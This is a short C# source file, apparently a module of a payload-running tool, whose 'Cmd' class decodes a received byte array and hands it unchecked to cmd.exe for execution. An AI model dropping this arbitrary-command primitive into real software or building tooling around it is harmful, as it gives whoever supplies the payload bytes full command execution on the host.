using System.Diagnostics;

namespace Runner.Payloads
{
    class Cmd : IPayload
    {
        void IPayload.run(byte[] payload_data)
        {
            string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
            Process.Start("cmd.exe", args);
        }
    }
}
